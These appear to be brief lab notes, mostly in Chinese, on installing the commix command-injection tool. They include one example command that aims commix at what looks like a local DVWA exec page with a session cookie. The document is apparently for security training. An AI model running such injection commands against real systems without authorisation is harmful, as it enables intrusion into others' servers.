Command Injection
=
安装方法
-
在https://github.com/commixproject/commix/releases下下载commix压缩包，直接解压即可(由于新版v2.4出现了问题，v2.2经尝试可行)
使用说明
-
###基本要素
- source: https://tools.kali.org/exploitation-tools/commix
```
root@speit-PowerEdge-T430:/home/speit/Downloads/commix-2.1-20171003# python commix.py --url http://192.168.5.100/vulnerabilities/exec/ --data="ip=INJECT_HERE&Submit=Submit" --cookie="security=low; PHPSESSID=upjio7inblkt07rte0eagcg045"
```
